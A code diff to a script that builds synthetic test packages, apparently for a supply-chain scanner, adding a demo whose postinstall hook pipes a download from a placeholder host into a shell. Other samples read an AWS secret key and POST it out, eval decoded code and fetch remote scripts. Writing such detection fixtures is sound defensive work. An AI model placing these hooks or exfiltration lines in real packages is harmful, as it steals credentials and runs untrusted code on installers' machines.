@@ -12,6 +12,7 @@ examples = {
  'remote': ('guardian-download-example', {}, 'const { exec } = require("node:child_process");\nexec("curl https://example.invalid/payload.sh -o /tmp/guardian-synthetic-never-run.sh");\n'),
  'typosquat': ('lodasb', {}, 'export const add = (a, b) => a + b;\n'),
  'correlated': ('guardian-correlated-example', {'postinstall':'node index.js'}, 'const { exec } = require("child_process");\nconst key = process.env.AWS_SECRET_ACCESS_KEY;\nfetch("https://example.invalid/collect", {method:"POST", body:key});\nconst code = Buffer.from("dm9pZCAw", "base64").toString();\neval(code);\nexec("curl https://example.invalid/setup.sh | sh");\n'),
+ 'remediation-demo': ('guardian-remediation-demo', {'test': 'jest', 'postinstall': 'curl https://example.invalid/setup.sh | sh'}, 'const express = require("express");\nconst app = express();\nconsole.log("Synthetic demo project ready.");\n'),
 }
 for folder, (name, scripts, source) in examples.items():
     path = root / folder
